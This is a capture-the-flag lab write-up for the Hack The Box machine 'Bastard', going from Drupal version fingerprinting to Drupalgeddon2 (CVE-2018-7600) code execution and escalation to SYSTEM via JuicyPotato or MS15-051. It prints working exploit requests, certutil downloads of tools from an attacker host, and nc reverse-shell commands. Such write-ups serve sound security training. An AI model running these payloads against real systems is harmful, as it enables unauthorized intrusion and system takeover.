---
title: HTB — Bastard
type: lab-writeup
platform: HTB
difficulty: intermediate
os: Windows
status: Complete
date: 2026-03-28
tags:
  - intermediate
  - lab
  - HTB
  - windows
  - Drupal
  - CVE-2018-7600
  - Drupalgeddon2
  - token-impersonation
  - JuicyPotato
---

# HTB — Bastard

## Lab Info

| Field | Value |
|---|---|
| Platform | Hack The Box |
| Box | Bastard |
| Difficulty | Medium |
| OS | Windows Server 2008 R2 |
| IP | Machine IP (assigned at launch) |
| Date | 2026-03-28 |

> **Summary:** Drupal 7.54 is vulnerable to Drupalgeddon2 (CVE-2018-7600), allowing unauthenticated RCE. Privilege escalation via token impersonation (JuicyPotato / MS15-051) to SYSTEM.

---

## Objectives

- [x] Recon: identify Drupal CMS version
- [x] Exploit: Drupalgeddon2 for initial shell
- [x] Priv esc: token impersonation to SYSTEM

---

## Enumeration

### Port Scan

```bash
nmap -sC -sV -oN nmap/bastard_initial <MACHINE_IP>
```

**Open ports:**

| Port | Service | Notes |
|---|---|---|
| 80/tcp | http | Microsoft IIS 7.5, Drupal |
| 135/tcp | msrpc | Microsoft Windows RPC |
| 49154/tcp | msrpc | Microsoft Windows RPC |

### Web Enumeration

```bash
# Identify Drupal version
curl -s http://<IP>/CHANGELOG.txt | head -5
# Drupal 7.54, 2017-02-01

# Alternate version detection
curl -s http://<IP>/core/CHANGELOG.txt      # Drupal 8+
droopescan scan drupal -u http://<IP>/      # Automated scanner
```

- Drupal 7.54 confirmed via `CHANGELOG.txt`
- Default Drupal login at `/user/login`
- `robots.txt` reveals standard Drupal paths

---

## Vulnerability Background

**CVE-2018-7600 — Drupalgeddon2**

Drupal versions before 7.58 (Drupal 7.x) and 8.5.1 (Drupal 8.x) contain a remote code execution vulnerability. The Form API does not sufficiently sanitize input in certain form renderable arrays, allowing an attacker to inject and execute arbitrary PHP code without authentication.

| Field | Detail |
|---|---|
| CVE | CVE-2018-7600 |
| Weakness | CWE-20: Improper Input Validation |
| Impact | Unauthenticated remote code execution |
| CVSS | 9.8 (Critical) |
| Fix | Upgrade to Drupal 7.58+ or 8.5.1+ |

---

## Foothold

### Drupalgeddon2 Exploit

```bash
# Using public exploit script (Ruby)
# https://github.com/dreadlocked/Drupalgeddon2
ruby drupalgeddon2.rb http://<MACHINE_IP>/

# Or: Metasploit
msfconsole
use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS <MACHINE_IP>
set LHOST <YOUR_IP>
run
```

### Manual Exploitation

```bash
# The vulnerability is in the user registration form
# POST to /user/register with crafted form elements

curl -s 'http://<MACHINE_IP>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=certutil -urlcache -f http://<YOUR_IP>:8080/nc.exe C:\inetpub\drupal\nc.exe'

# Then trigger reverse shell
curl -s 'http://<MACHINE_IP>/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax' \
  --data 'form_id=user_register_form&_drupal_ajax=1&mail[#post_render][]=exec&mail[#type]=markup&mail[#markup]=C:\inetpub\drupal\nc.exe -e cmd.exe <YOUR_IP> 4444'
```

Shell connects as `iis apppool\drupal` (or `nt authority\iusr`).

---

## Privilege Escalation

### System Enumeration

```cmd
whoami
# iis apppool\drupal

whoami /priv
# SeImpersonatePrivilege — Enabled
# SeAssignPrimaryTokenPrivilege — Enabled

systeminfo
# Windows Server 2008 R2 Datacenter — 6.1 Build 7600
# No hotfixes
```

**SeImpersonatePrivilege** is the key finding — enables token impersonation attacks.

### Method 1: JuicyPotato

```bash
# Upload JuicyPotato.exe and nc.exe to target
certutil -urlcache -f http://<YOUR_IP>:8080/JuicyPotato.exe C:\temp\jp.exe
certutil -urlcache -f http://<YOUR_IP>:8080/nc.exe C:\temp\nc.exe

# Start listener
nc -lvnp 5555

# Execute — CLSID may need adjustment for Windows Server 2008 R2
C:\temp\jp.exe -l 1337 -p C:\temp\nc.exe -a "-e cmd.exe <YOUR_IP> 5555" -t *
```

### Method 2: MS15-051

```bash
# Kernel exploit for Windows Server 2008 R2 without patches
# Upload ms15-051x64.exe
certutil -urlcache -f http://<YOUR_IP>:8080/ms15-051x64.exe C:\temp\ms15.exe

# Execute command as SYSTEM
C:\temp\ms15.exe "C:\temp\nc.exe -e cmd.exe <YOUR_IP> 5555"
```

Shell connects as `NT AUTHORITY\SYSTEM`.

---

## Post-Exploitation

### Flags

| Flag | Location |
|---|---|
| User | `C:\Users\dimitris\Desktop\user.txt` |
| Root | `C:\Users\Administrator\Desktop\root.txt` |

---

## Key Takeaways

- Drupal's `CHANGELOG.txt` is the fastest way to fingerprint the version — always check it
- Drupalgeddon2 is one of the highest-impact CMS vulns — unauthenticated RCE on a widely deployed platform
- **SeImpersonatePrivilege** on Windows service accounts (IIS, SQL) = JuicyPotato / PrintSpoofer / token impersonation
- Windows Server 2008 R2 with no hotfixes is vulnerable to multiple kernel exploits (MS15-051, MS16-032)
- Always check `whoami /priv` early — token privileges dictate your escalation path

---

## Tools Used

- Nmap
- Netcat
- Metasploit (optional)
- JuicyPotato / ms15-051
- droopescan (Drupal scanner)

---

## References

- [Hack The Box — Bastard](https://app.hackthebox.com/machines/Bastard)
- [CVE-2018-7600 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)
- [Drupalgeddon2 — Drupal SA-CORE-2018-002](https://www.drupal.org/sa-core-2018-002)
- [JuicyPotato — GitHub](https://github.com/ohpe/juicy-potato)

---
*Write-up completed: 2026-03-28*

## See Also

- Penetration-Testing-Methodology
- Windows-Privilege-Escalation
- Web-Application-Testing
- Nmap
- Reverse-Shell-Cheatsheet
---
<- [[Labs-MOC]]